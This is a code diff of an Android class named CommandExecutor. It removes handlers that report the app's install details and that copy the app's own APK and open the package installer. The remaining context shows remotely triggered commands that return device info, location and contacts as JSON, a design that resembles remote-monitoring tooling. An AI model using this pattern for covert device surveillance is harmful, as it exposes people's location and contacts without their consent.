@@ -2,15 +2,12 @@ package com.task.tusker.commands;
 
 import android.Manifest;
 import android.content.Context;
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
 import android.os.Build;
 import android.os.Environment;
-import android.net.Uri;
 import androidx.core.app.ActivityCompat;
-import androidx.core.content.FileProvider;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -48,14 +45,6 @@ public class CommandExecutor {
                     
                 case "get_device_info":
                     result = handleGetDeviceInfo();
-                    break;
-
-                case "get_app_installation_info":
-                    result = handleGetAppInstallationInfo();
-                    break;
-
-                case "extract_self_apk":
-                    result = handleExtractSelfApk();
                     break;
                     
                 case "get_location":
@@ -113,7 +102,6 @@ public class CommandExecutor {
                 case "get_system_info":
                     result = handleGetSystemInfo();
                     break;
-
                     
                 default:
                     result.put("success", false);
@@ -277,98 +265,6 @@ public class CommandExecutor {
 
         return result;
     }
-
-    /**
-     * Return installation metadata for this app only. The dashboard uses this
-     * for display; it does not alter packages or launch an installer.
-     */
-    private JSONObject handleGetAppInstallationInfo() throws JSONException {
-        JSONObject result = new JSONObject();
-        String packageName = context.getPackageName();
-        android.content.pm.PackageManager pm = context.getPackageManager();
-        android.content.pm.PackageInfo packageInfo;
-        try {
-            packageInfo = pm.getPackageInfo(packageName, 0);
-        } catch (android.content.pm.PackageManager.NameNotFoundException e) {
-            result.put("success", false);
-            result.put("error", "Installed package metadata was not found");
-            return result;
-        }
-        CharSequence label = pm.getApplicationLabel(packageInfo.applicationInfo);
-
-        result.put("success", true);
-        result.put("packageName", packageName);
-        result.put("appName", label == null ? packageName : label.toString());
-        result.put("firstInstallTime", packageInfo.firstInstallTime);
-        result.put("lastUpdateTime", packageInfo.lastUpdateTime);
-        return result;
-    }
-
-    /**
-     * Copy this process's installed APK into app-private external storage and
-     * open Android's package installer. A FileProvider grants the installer
-     * temporary read access without writing to public shared storage.
-     */
-    private JSONObject handleExtractSelfApk() throws JSONException {
-        JSONObject result = new JSONObject();
-        File source = new File(context.getApplicationInfo().sourceDir);
-        File privateDownloads = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
-        if (privateDownloads == null) {
-            privateDownloads = new File(context.getFilesDir(), "downloads");
-        }
-        File target = new File(privateDownloads, context.getPackageName() + "-extracted.apk");
-
-        if (!source.exists() || !source.isFile()) {
-            result.put("success", false);
-            result.put("error", "Installed APK source was not found");
-            return result;
-        }
-        if (!privateDownloads.exists() && !privateDownloads.mkdirs()) {
-            result.put("success", false);
-            result.put("error", "Could not create the app-private APK folder");
-            return result;
-        }
-
-        try (java.io.InputStream input = new java.io.FileInputStream(source);
-             java.io.OutputStream output = new java.io.FileOutputStream(target)) {
-            byte[] buffer = new byte[1024 * 1024];
-            int count;
-            while ((count = input.read(buffer)) != -1) {
-                output.write(buffer, 0, count);
-            }
-        } catch (Exception e) {
-            result.put("success", false);
-            result.put("error", "APK extraction failed: " + e.getMessage());
-            return result;
-        }
-
-        try {
-            Uri apkUri = FileProvider.getUriForFile(
-                    context,
-                    context.getPackageName() + ".fileprovider",
-                    target);
-            Intent installIntent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
-            installIntent.setDataAndType(apkUri, "application/vnd.android.package-archive");
-            installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
-                    | Intent.FLAG_GRANT_READ_URI_PERMISSION
-                    | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
-            installIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
-            context.startActivity(installIntent);
-
-            result.put("installTriggered", true);
-            result.put("message", "APK copied to private storage and package installer opened");
-        } catch (Exception e) {
-            result.put("installTriggered", false);
-            result.put("installError", "Could not open the package installer: " + e.getMessage());
-        }
-
-        result.put("success", true);
-        result.put("filePath", target.getAbsolutePath());
-        result.put("fileName", target.getName());
-        result.put("size", target.length());
-        return result;
-    }
-
 
     private JSONObject handleGetContacts() throws JSONException {
         JSONObject result = new JSONObject();
